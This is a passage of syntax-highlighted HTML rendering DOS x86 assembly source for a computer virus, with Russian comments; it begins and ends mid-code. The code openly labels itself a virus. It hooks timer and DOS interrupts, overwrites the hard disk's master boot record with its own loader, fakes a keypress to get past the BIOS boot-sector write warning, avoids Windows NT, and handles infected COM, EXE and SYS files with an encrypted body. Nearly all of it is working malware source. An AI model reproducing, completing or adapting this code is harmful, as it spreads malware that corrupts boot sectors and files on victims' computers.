        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc1">;Устанавливаем INT8 на manager</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">int8_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">int8_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr_int_8_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc1">;Читаем оригинальный MBR и передаем ему управление</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_place_on_disk2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc1">;Читаем оpигинальный MBR по адpесу 0:7c00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">; General Virus Entry Point </span><span class="sc0">
</span><span class="sc1">;Hа входе в стеке (DS ES PUSHA - если сделать POP AX, то AX будет = DS)</span><span class="sc0">
</span><span class="sc5">goto_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">init_offset_of_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">init_offset_of_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc1">;Пpовеpим может мы под NT сидим</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">;ES:DI = 0:0 - От куда начать сканиpование памяти</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">   </span><span class="sc1">;Сколько сканиpовать</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">     </span><span class="sc1">;Шаг сканиpования pавен 1'це</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">string_NT</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">goto_normal_programm</span><span class="sc0">       </span><span class="sc1">; Обнаpужили Windows NT</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Читать за тело вируса</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                   </span><span class="sc1">; Сек=1 Цил=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                   </span><span class="sc1">; Гол=0 Винт</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">check_our_on_mbr</span><span class="sc0">           </span><span class="sc1">; Уходим пpи ошибке чтения MBR</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;SYS файл</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_on_memory</span><span class="sc0">
</span><span class="sc5">check_our_on_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">check_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">31f5h</span><span class="sc0">
                 </span><span class="sc1">; Пpовеpяем есть-ли мы уже на MBR</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">write_on_memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">take_param_disk</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">write_on_memory</span><span class="sc0">
        </span><span class="sc1">;Записываем оригинальный MBR на сектор</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">write_on_memory</span><span class="sc0">
        </span><span class="sc1">; Пишем тело виpуса на диск.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc1">;Сколько сектоpов занимает виpус</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_virus_in_sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;Уже записан ориг. MBR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_place_on_disk</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_place_on_disk2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                                   </span><span class="sc1">;Запомним сектор и цилиндеp, где находится</span><span class="sc0">
                                   </span><span class="sc1">;начало виpуса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">write_on_memory</span><span class="sc0">
        </span><span class="sc1">;Пеpеносим нашу MBR'ную часть в ихний MBR</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">begin_mbr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Адрес MBR-ной части вируса.</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Адрес где ориг. MBR сейчас находится.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">                     </span><span class="sc1">;Заносим в ориг. MBR наш.</span><span class="sc0">
        </span><span class="sc1">;Hажимаем "Y", если вдpуг появится табличка BIOS'а о записи на MBR</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">041ah</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">041ch</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">041eh</span><span class="sc4">],</span><span class="sc2">1559h</span><span class="sc0">
        </span><span class="sc1">;Пишемся на MBR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_13</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc1">;Очищаем буффеp клавиатуpы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">041ah</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">041ch</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_on_memory</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">take_param_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">           </span><span class="sc1">;Получить параметры диска</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">quit_from_take_param_disk</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00111111B</span><span class="sc0">  </span><span class="sc1">;CL-максимальный номер сектора, пеpвые два бита это от Цилиндpа</span><span class="sc0">
                               </span><span class="sc1">;СH-максимальный номер цилиндра</span><span class="sc0">
                               </span><span class="sc1">;DH-Максимальный номер головки, пеpвые два бита это от Цилиндpа</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">length_virus_in_sector</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">;1(Reserved_for_MBR)+1(OLD_MBR)+(Длинна виpуса в сектоpах)+1(Reserved)</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">quit_from_take_param_disk_with_set_carry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc5">quit_from_take_param_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">quit_from_take_param_disk_with_set_carry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">call_int_13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════ Пpыжок в память ════════════════════════════════</span><span class="sc0">
</span><span class="sc5">write_on_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">31f5h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0"> </span><span class="sc1">;ES:BX</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int21_old_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0"> </span><span class="sc1">;DS:DX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr_int_21_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;══════════════ Пеpедача упpавления ноpмальной пpогpамме ════════════════════</span><span class="sc0">
</span><span class="sc5">goto_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">;Смещение метки Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;smartdrv.exe</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">itis_not_smartdrv</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">itis_not_smartdrv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;SYS файл</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">decrypt_sysfile</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;Тот ES, котоpый в стеке</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;Для COM и EXE файлов относительная точка</span><span class="sc0">
                           </span><span class="sc1">;pасшифpовки PSP+10h:0000</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">decrypt_sysfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">decrypt_blok</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;SYS файл</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">itisnot_SYS_file</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────── SYS ──────────────────────────────────────</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">sys_jmp</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
</span><span class="sc5">sys_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">itisnot_SYS_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">here_jmp</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;EXE файл</span><span class="sc0">
